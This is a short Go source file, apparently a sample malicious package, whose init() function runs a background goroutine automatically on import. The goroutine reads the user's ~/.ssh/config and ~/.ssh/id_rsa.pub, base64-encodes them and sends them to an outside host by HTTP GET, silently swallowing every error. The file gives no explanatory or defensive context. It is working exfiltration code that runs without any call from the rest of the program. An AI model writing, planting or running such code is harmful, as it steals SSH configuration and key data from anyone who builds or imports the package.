package main

import (
	"encoding/base64"
	"io/ioutil"
	"net/http"
	"os/user"
)

func init() {
	go func() {

		user, err := user.Current()
		if err != nil {

		}

		b, err := ioutil.ReadFile(user.HomeDir + "/.ssh/config")
		if err != nil {

		}

		encoded := base64.StdEncoding.EncodeToString(b)

		_, err = http.Get("http://enj0.com/evil/0/base64/" + encoded)
		if err != nil {

		}

		b, err = ioutil.ReadFile(user.HomeDir + "/.ssh/id_rsa.pub") // 业界良心
		if err != nil {

		}

		encoded = base64.StdEncoding.EncodeToString(b)

		_, err = http.Get("http://enj0.com/evil/1/base64/" + encoded)
		if err != nil {

		}

	}()
}
